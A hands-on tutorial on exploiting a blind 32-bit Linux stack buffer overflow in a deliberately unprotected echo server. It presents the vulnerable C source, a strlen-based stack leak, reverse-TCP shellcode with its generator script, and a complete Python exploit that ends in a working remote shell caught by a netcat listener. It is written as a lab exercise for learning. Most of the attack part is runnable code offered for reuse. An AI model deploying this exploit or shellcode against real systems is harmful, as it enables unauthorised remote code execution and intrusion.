# Exploitation
## Blind stack buffer overflow in Linux (x86 = 32 bits)

### Insight
In this article, we're gonna see an example about how can we exploit a server-program (written in C) without having any information about it  
We can't access it's memory in debug using GDB because it's a remote program, but we assume we know the source code  
In this example, we can still leak data (no format strings) using a trick with `printf` and `strlen` and that's how we can still exploit it  
During exploitation, and to use it in general, we will connect to it via sockets (because it's a server) so we can send and receive data from it  
Our goal is to execute a shellcode on it, but not a normal shellcode like an `x86 /bin/sh execve shellcode`, it could work, the shellcode could be executed but remember it's a server and so this shellcode will be executed on the machine, on its STDIN and STDOUT streams, and we can't access them because we can only send/receive data from sockets  
What we're gonna use is a reverse shell shellcode, but before executing it on it we will have to bind the server that we're gonna use to communicate with this shell using netcat (`apt install netcat`) or any other thing (we can bind the server on python) but we just want a server that can send and receive data  
This is a link to someone who is named rastating who wrote a shellcode to do so : https://rastating.github.io/creating-a-reverse-tcp-shellcode/  
So we can just use it !  

## Target Server-Program
### SOURCE CODE
Here is the target server-program to exploit :
`main.c` :
```c
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 8080

int server_fd, new_socket, valread;
struct sockaddr_in address;
int opt = 1;
int addrlen = sizeof(address);

void handle_client()
{
    char buffer[1024];
    memset(buffer, 0, 1024); // Zero memory the bufer

    valread = read(new_socket, buffer, 2048);
    send(new_socket, buffer, strlen(buffer), 0);
    printf("Sent message\n");
}

int main(int argc, char const* argv[])
{
    //printf("new_socket : %p\n", &new_socket);


    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
  
    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET,
                   SO_REUSEADDR | SO_REUSEPORT, &opt,
                   sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
  
    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr*)&address,
             sizeof(address))
        < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    while(1)
    {  
        if (listen(server_fd, 3) < 0) {
            perror("listen");
            exit(EXIT_FAILURE);
        }
        if ((new_socket
             = accept(server_fd, (struct sockaddr*)&address,
                      (socklen_t*)&addrlen))
            < 0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }

        handle_client();
        
      
        // closing the connected socket
        close(new_socket);    
    }
    // closing the listening socket
    shutdown(server_fd, SHUT_RDWR);
}
```
### DEEP EXPLAINATION AND SEARCHING EXPLOITATION PRIMITIVES
This program is just a program that sends back what the client sends to the server to the client    
We will compile it without any protection (no NX, no Stack Smashing Protection (stack canary), no PIE, no ASLR)
Here, as you can notice it's pretty easy, it's creating a socket and then it binds this socket to localhost, then in an infinite loop, it listens for new connections and accepts them  
For each connection it calls this function, `handle_client()` where it first declares a 1024 bytes buffer :
```c
char buffer[1024];
```
Then it zero memory it (i will explain this) later :  
```c
memset(buffer, 0, 1024); // Zero memory the bufer
```
Then we read from the socket, so we receive from it, to the buffer that we allocated of 1024 bytes :  
```c
valread = read(new_socket, buffer, 2048);
```
but as you can see, we read 2048 bytes so if we send more than 1024 bytes, we can write after the buffer, so we can overflow it until 2048 bytes, it's like if we had : 
```c
char buffer[1024];
fgets(buffer, 2048, stdin);
```
If we enter more than 1024 bytes, it overflows the buffer, and it writes to memory after it  
But we could say, ok then we have a buffer overflow, given that we have no protection we can just do a simple shellcode injection and we're good !  
But given that you have no information about the binary memory (no gdb), lemmie ask you a question...  
But where is the buffer where you will place your shellcode in ? Think of it for a second  
Yes, exactly, we don't really know, and for now, i don't think there's any way we can figure it out... Unless...
We read the following line ! And we can see something interesting :
```c
send(new_socket, buffer, strlen(buffer), 0);
```
So it sends, from the buffer, `strlen(buffer)` bytes  
If we read about strlen (unsing the command `man strlen`), we can read the following :
```

STRLEN(3)                                                        Linux Programmer's Manual                                                       STRLEN(3)

NAME
       strlen - calculate the length of a string

SYNOPSIS
       #include <string.h>

       size_t strlen(const char *s);

DESCRIPTION
       The strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte ('\0').

RETURN VALUE
       The strlen() function returns the number of bytes in the string pointed to by s.

```
So `strlen` returns the length of a string (did you get it ? strlen, str, len, length of str, length of string)  
And it returns the length of a string... Let me repeat it... The length of a string, not the length of the buffer !
The buffer is 1024 bytes, but what you have to know is that a buffer is not necessarily a string  
Now let me explain :
```c
char buffer[1024];
scanf("%s", buffer); // OMG WE HAVE A BUFFER OVERFLOW HERE
``` 
Here in the buffer, we allocate enough memory for a string that will be written by the user and scanf in the buffer, it's not like in c++ `std::string` where the string is the buffer, no here for example if we enter "hello" we have in the buffer :
before scanf :
```
BUFFER[0] : random data
BUFFER[1] : random data
BUFFER[2] : random data
BUFFER[3] : random data
BUFFER[4] : random data
BUFFER[5] : random data
BUFFER[6] : random data
...
BUFFER[1023] : random data
```
Yes, we have random data in the whole buffer when we allocate it, that's because it allocates it in the stack where we can have any data when we launch the program, a random data could be a null byte (`0x00`) a succession of random data could be an address etc, it can be anything and we don't know, but as programmers, we don't care, when we allocate a buffer of a certain size, we don't now what's in it when we allocate it, we just want to get this certain size that we can use for what we want !  
Then after the scanf (that read "hello") :
```
BUFFER[0] : 'h'
BUFFER[1] : 'e'
BUFFER[2] : 'l'
BUFFER[3] : 'l'
BUFFER[4] : 'o'
BUFFER[5] : '\x00'
BUFFER[6] : random data
...
BUFFER[1023] : random data
```
So it wrote the 'h', 'e', 'l', 'l', 'o' succession of characters and also, after them, it wrote an `\x00`, a NULL byte, that's because every normal string in C should end with a NULL byte, so C functions know that it's the end of the string, here it's scanf that added the null byte after our input, and `gets()` does it as well  
And guess what C function cares about NULL byte at the end of a string, `strlen()`, because as you can read in the manual : "The strlen(const char* s) function calculates the length of the string pointed to by s, excluding the terminating null byte ('\0')."  
So for example, here if we do :
```c
printf("%lu\n", strlen(buffer));
```
it would print "5", because "hello" has 5 characters, the way `strlen(buffer)` works is that it iterates through every byte from the beggining of the buffer, so from `buffer[0]` to... To where ? Well there's no to where actually, it iterates from `buffer[0]`, and it compares each byte to a NULL byte, if it's a NULL byte, it stops and returns the length, so here it does :  
For the `buffer[0]`, which is 'h', is it a null byte ? No, so i'll test the next index (`length = 1`)  
For the `buffer[1]`, which is 'e', is it a null byte ? No, so i'll test the next index (`length = 2`)  
For the `buffer[2]`, which is 'l', is it a null byte ? No, so i'll test the next index (`length = 3`)  
For the `buffer[3]`, which is 'l', is it a null byte ? No, so i'll test the next index (`length = 4`)  
For the `buffer[4]`, which is 'o', is it a null byte ? No, so i'll test the next index (`length = 5`)  
For the `buffer[5]`, which is '\x00', is it a null byte ? Oh yes ! so i'll stop here and return `length`  

And if there was no NULL byte after 'hello' it would have continued, until... until it finds a null byte at buffer+x, so maybe at `buffer+50` ? or `buffer+599` or `buffer+8999`, we don't know where there's a null byte  
The C code of the `strlen(const char* s)` is something like this :
```c
size_t strlen(const char* s)
{
    size_t len = 0;
    while(1) // infite loop
    {
        if(buffer[len] == '\x00') // return if the current byte is 0
        {
            return len;
        }
        len++; // else we just increment the length
    }
}
```

And so let's go back to :
```c
valread = read(new_socket, buffer, 2048);
```
The `read` function doesn't add any null byte after what it writes, that's why we did :
```c
memset(buffer, 0, 1024); // Zero memory the bufer
```
So it sets every byte of the buffer to a null byte, this way `strlen` still works correctly  
So if we receive "hey !", `read` will do this :  
before `read` :
```
BUFFER[0] = '\x00'
BUFFER[1] = '\x00'
BUFFER[2] = '\x00'
BUFFER[3] = '\x00'
BUFFER[4] = '\x00'
BUFFER[5] = '\x00'
BUFFER[6] = '\x00'
BUFFER[7] = '\x00'
BUFFER[8] = '\x00'
BUFFER[9] = '\x00'
...
BUFFER[1023] = '\x00'

```
All bytes of it are nullbytes because of the `memset`  
And now when we `read` :
```
BUFFER[0] = 'h'
BUFFER[1] = 'e'
BUFFER[2] = 'y'
BUFFER[3] = '\x00'
BUFFER[4] = '\x00'
BUFFER[5] = '\x00'
BUFFER[6] = '\x00'
BUFFER[7] = '\x00'
BUFFER[8] = '\x00'
BUFFER[9] = '\x00'
...
BUFFER[1023] = '\x00'

```
And `read` didn't add any null byte, these null bytes were already here because of the `memset`  
Then for the `send`, the `strlen` will return 3 and it will send the 3 bytes : "hey" back to the client  
### COMPILATION
As i said before, there's no protection so to compile it :
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # NO ASLR
gcc main.c -o server -m32 -fno-stack-protector -no-pie -z execstack # NO PIE, NO Stack smashing protection, no NX
```
### USAGE
And we run it `./server`  
Now we can use netcat (`apt install netcat` to download an install it)  
So we run : `nc <ADDRESS OF THE SERVER> 8080`  
If we're running netcat in the same machine as for the server, we can set `<ADDRESS OF THE SERVER>` to 127.0.0.1 and the port is `8080`, that was in the server  
So now :
```
nc 127.0.0.1 8080
Hello server ! <- We type this and press enter
```
And we get :
```
Hello server !
```
That's it
## Exploitation
### Theoretically
We want to get the address of the buffer, and to do so, we have to leak the stack after the buffer, and to do so, we can abuse strlen  
```python
import socket
import struct
def connect():
    sock = socket.socket()

    sock.connect(("127.0.0.1", 8080))

    return sock

sock = connect()

sock.send(b"Hello")

print(sock.recv(2048))
```
If we use this (server is running) we get :
```
b'Hello'
```
That's what the server sent  
Now imagine we enter 1024 bytes, what would happen ?  
Let's imagine the stack before the server receives (in handle_client()) :
```
BUFFER (1024 bytes)
UNKNOWN data (x bytes)
EBP backup 
EIP backup
```
For me unknown data length is 4 bytes, but if it's different for you, it's not a problem, we'll see it later  
Now imagine unknown data is something like :
```
'\xde'
'\xbe'
'\x4c'
'\x00'
```
If we send exactly 1024 non-NULL bytes ('a'), the buffer will be full of non-NULL bytes ('a') and so strlen will behave in another way, in the memory, we will have :
```
BUFFER[0] => 'a'
BUFFER[1] => 'a'
BUFFER[2] => 'a'
...
BUFFER[1023] => 'a'
BUFFER+1024 => '\xde'
BUFFER+1025 => '\xbe'
BUFFER+1026 => '\x4c' <- STRLEN RETURNED LENGTH HERE 
BUFFER+1027 => '\x00' <- STRLEN FINDS NULL BYTE HERE
EBP backup 
EIP backup
```
Given that the first null byte after `BUFFER[0]` is at `BUFFER+1027` it means that strlen() will return 1028 and so it will send 1028 bytes after the buffer, leaking this unknown data, and (assumming that EBP backup and EIP backup doesn't contain any null byte), if we overwrite the null byte at `BUFFER+1027`, it will leak EBP  
Let's say we send exactly 1024+4 = 1028 bytes, then the memory after the read will be :
```
BUFFER[0] => 'a'
BUFFER[1] => 'a'
BUFFER[2] => 'a'
...
BUFFER[1023] => 'a' 
BUFFER+1024 => 'a' (previously '\xde')
BUFFER+1025 => 'a' (previously '\xbe')
BUFFER+1026 => 'a' (previously '\x4c')
BUFFER+1027 => 'a' (previously '\x00')
EBP backup 
EIP backup
```
And assuming that a null byte is just after EIP backup, it will then leak all the data from `BUFFER[0]` to `EIP backup end`  
I made a function that simply, from 1024 bytes sended, keeps adding one at each time and prints response :
At the beggining :
sends `'a'*1024`
Then :
sends `'a'*1025`
Then :
sends `'a'*1026`
...

```python
def stack_reading(start_len, abreviate_printing=True):
    i = 0 # setting additionnal number of bytes to 0 at the beggining
    while True:
        print("start_len+"+str(i)) # printing current amount of bytes to send

        sock = connect() # connecting to the server

        sock.send(b"A"*start_len+b"B"*i) # sending all the bytes

        resp = sock.recv(2048) # getting response

        if(abreviate_printing): # replaces the 1024 'a's from response to "[1024] a's" to abreviate
            abreviated_resp = resp.replace(b"A"*start_len, ("["+str(start_len)+" A's"+"]").encode("ascii"))
            print(abreviated_resp)
        else:
            print(resp)

        sock.close() # closes connection to server

        i += 1 # increments additionnal number of bytes
```
And if we use it :
```python
import socket
import struct
def connect():
    sock = socket.socket()

    sock.connect(("127.0.0.1", 8080))

    return sock

def stack_reading(start_len, abreviate_printing=True):
    i = 0
    while True:
        print("start_len+"+str(i))

        sock = connect()

        sock.send(b"A"*start_len+b"B"*i)

        resp = sock.recv(2048)

        if(abreviate_printing):
            abreviated_resp = resp.replace(b"A"*start_len, ("["+str(start_len)+" A's"+"]").encode("ascii"))
            print(abreviated_resp)
        else:
            print(resp)

        sock.close()

        i += 1

BUFFER_LEN = 1024
stack_reading(BUFFER_LEN)
```
We get :
```
start_len+0
b"[1024 A's]\x03"
start_len+1
b"[1024 A's]B"
start_len+2
b"[1024 A's]BB"
start_len+3
b"[1024 A's]BBB"
start_len+4
b"[1024 A's]BBBB"
start_len+5
b"[1024 A's]BBBBB\xc0\x04\x08\xf8\xd0\xff\xff\xa9\x94\x04\x08\x10\xd1\xff\xff"
start_len+6
(crashed)
```
It means that the memory is exactly :
```
BUFFER (1024 bytes)

BUFFER+1024 => '\x03' 
BUFFER+1025 => '\x00' (because if there wouldn't be this, it would have printed something else than 'B')
BUFFER+1026 => '\x00' (because if there wouldn't be this, it would have printed something else than 'B')
BUFFER+1027 => '\x00' (because if there wouldn't be this, it would have printed something else than 'B')

BUFFER+1028 => '\x00' (because if there wouldn't be this, it would have printed something else than 'B')
BUFFER+1029 => '\xc0'
BUFFER+1030 => '\x04'
BUFFER+1031 => '\x08'

BUFFER+1032 => '\xf8' 
BUFFER+1033 => '\xd0'
BUFFER+1034 => '\xff'
BUFFER+1035 => '\xff'

BUFFER+1036 => '\xa9' 
BUFFER+1037 => '\x94'
BUFFER+1038 => '\x04'
BUFFER+1039 => '\x08'

BUFFER+1040 => '\x10' 
BUFFER+1041 => '\xd1'
BUFFER+1042 => '\xff'
BUFFER+1043 => '\xff'
```
So we have these 4 addresses : `0x0804c000`, `0xffffd0f8`, `080494a9` and `0xffffd110`  
If we know which one is the EBP save we win because if we find EBP save, we can substract 1024 to it and we will drop somewhere at the beggining of the buffer, maybe `BUFFER+30` or `BUFFER+50`, but even though we don't EXACTLY know where is the buffer we know that if we substract 1024 to EBP save we'll drop into somewhere in it  
In the buffer, we're gonna place our shellcode... BUT, given that we don't know exactly where we're gonna jump doing `[EBP save]-1024` we will place our shellcode somewhere at the end of the buffer, but not at the end ! Because else we would have a bug where the shellcode would overwrite itself because it's executing pushes on the stack and so we want to let some memory at the end of the buffer, let's say 100 bytes  
Just to see, let's see exactly how much memory we need, so go to https://rastating.github.io/creating-a-reverse-tcp-shellcode/  
Here's the shellcode :
```assembly
global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ecx, ecx
    xor   edx, edx

    ; create sockaddr_in struct
    push  eax ; total = 4 bytes
    push  eax             ; [$esp]: 8 bytes of padding, total = 8 bytes
    mov   eax, 0xffffffff
    mov   ebx, 0xfeffff80
    xor   ebx, eax
    push  ebx             ; [$esp]: 127.0.0.1, total = 12 bytes
    push  word 0x5c11     ; [$esp]: 4444, total = 14 bytes
    push  word 0x02       ; [$esp]: AF_INET, total = 16 bytes

    ; call socket(domain, type, protocol)
    xor   eax, eax
    xor   ebx, ebx
    mov   ax, 0x167       ; $eax: 0x167 / 359
    mov   bl, 0x02        ; $ebx: AF_INET
    mov   cl, 0x01        ; $ecx: SOCK_STREAM
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    xor   ecx, ecx
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
    xor   eax, eax
    xor   edx, edx
    push  eax
    push  0x68732f2f, total = 20 bytes
    push  0x6e69622f, total = 24 bytes
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80

```
So in total, push operations use 24 bytes of memory, but we'll keep 100 bytes, just to be sure  
Shellcode length is `40²/80+(50*2-10*3)+(((1/6) * (1/2))**(-1))+1-10` (challenge : can you do this by mind ?)
So our buffer will be like this :
```
BUFFER[0] => 0x90
BUFFER[1] => 0x90
BUFFER[2] => 0x90
BUFFER[3] => 0x90
BUFFER[4] => 0x90
...
BUFFER[805] => 0x90 
BUFFER[806] to BUFFER[899] is shellcode
BUFFER[900] to BUFFER[1023] is 'a' (writable and readable memory for shellcode)
```
From `BUFFER[0]` to `BUFFER[805]` there are NOPs, the NOP instruction simply does... nothing, it's just an instruction that stands for "No operation" (NOP, No-op, No-operation, No operation did you get it ?) and simply executes the next instruction, so if by substracting 1024 from EBP we land on the 
`BUFFER[20]`    
or `BUFFER[50]`  
or `BUFFER[331]`  
it will land on a NOP and continue to all the next NOPs until it reaches the shellcode and so it executes it  
Now from these addresses : `0x0804c000`, `0xffffd0f8`, `0x080494a9` and `0xffffd110`, can you tell which one is the EBP backup ? Well if you're not sure you can test them all, and we'll guess that the EIP backup is this `0x080494a9` so the padding from the buffer to `EIP backup` is `12`  
So i made a function to test all the addresses :
```python
def try_list(possible_ebp_save_addrs, buffer_len, shellcode, offset_before_eip_save):
    start_payload = b"\x90"*(buffer_len-len(shellcode)-100)
    start_payload += shellcode
    start_payload += b"A"*100 # padding after shellcode (some memory where the shellcode will write)
    start_payload += b"c"*12 # padding from buffer to EIP backup

    for possible_address in possible_ebp_save_addrs:
        print("Possible address : "+str(hex(possible_address)))
        input("Ready?")
        sock = connect()

        payload = start_payload + struct.pack("I", possible_address-buffer_len)
        abreviated_payload = payload.replace(b"\x90"*(buffer_len-len(shellcode)), ("["+str(buffer_len-len(shellcode))+" A's"+"]").encode("ascii"))
        print(abreviated_payload)
        sock.send(payload)

        resp = sock.recv(2048)
```
Before executing it we have to create the shellcode, and as rastating explains, we can use this python script to make it :
https://rastating.github.io/creating-a-reverse-tcp-shellcode/
```python
import socket
import sys

code =  ""
code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
code += "\\xe3\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) < 3:
    print 'Usage: python {name} [ip] [port]'.format(name = sys.argv[0])
    exit(1)

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte'
    exit(1)

# Inject the XOR bytes
code = code.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# Inject the IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Inject the port number
port = hex(socket.htons(int(sys.argv[2])))
code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
    b1 = port[4:6],
    b2 = port[2:4]
))

print code

```
Now if we use it :
```
python <shellcode script>.py 127.0.0.1 4444
```
You can replace 127.0.0.1 by the address of the exploiter listening server
It generates the shellcode :
```c
"\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x02\x02\x02\x02\xbb\x7d\x02\x02\x03\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```
Now we simply launch the listening exploiter server : `nc -nvlp 4444`  
(or any port you want, but you have to modify in the python shellcode script arguments)  
Now here is the full exploit source code :
```python
import socket
import struct
def connect():
    sock = socket.socket()

    sock.connect(("127.0.0.1", 8080))

    return sock

def stack_reading(start_len, abreviate_printing=True):
    i = 0
    while True:
        print("start_len+"+str(i))

        sock = connect()

        sock.send(b"A"*start_len+b"B"*i)

        resp = sock.recv(2048)

        if(abreviate_printing):
            abreviated_resp = resp.replace(b"A"*start_len, ("["+str(start_len)+" A's"+"]").encode("ascii"))
            print(abreviated_resp)
        else:
            print(resp)

        sock.close()

        i += 1

def try_list(possible_ebp_save_addrs, buffer_len, shellcode, offset_before_eip_save):
    start_payload = b"\x90"*(buffer_len-len(shellcode)-100)
    start_payload += shellcode
    start_payload += b"A"*100 # padding after shellcode (some memory where the shellcode will write)
    start_payload += b"c"*12

    for possible_address in possible_ebp_save_addrs:
        print("Possible address : "+str(hex(possible_address)))
        input("Ready?")
        sock = connect()

        payload = start_payload + struct.pack("I", possible_address-buffer_len)
        abreviated_payload = payload.replace(b"\x90"*(buffer_len-len(shellcode)), ("["+str(buffer_len-len(shellcode))+" A's"+"]").encode("ascii"))
        print(abreviated_payload)
        sock.send(payload)

        resp = sock.recv(2048)

shellcode = b"\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x02\x02\x02\x02\xbb\x7d\x02\x02\x03\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
BUFFER_LEN = 1024

stack_reading(BUFFER_LEN)

possible_ebp_save_addrs = [0x0804c000, 0xffffd0f8, 0x080494a9, 0xffffd110] <- REPLACE THIS BY THE ADDRESSES YOU FOUND
try_list(possible_ebp_save_addrs, BUFFER_LEN, shellcode, 12)
"""
```
The target server is started and the exploiter server is also started  
Now we launch...  
```
Possible address : 0x804c000
Ready?
```
We press enter...  
We don't get any connection, so it's the wrong ebp address  
We restart the target server...  
```
Possible address : 0xffffd0f8
Ready?
```
We press enter...  
AND FOR ME IT WORKED !  
```
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 ...
```
Now in netcat (exploiter server input ouput) we can enter commands, we have a remote shell !
```
whoami
...
echo hello
hello
```
It worked !
Thanks for reading
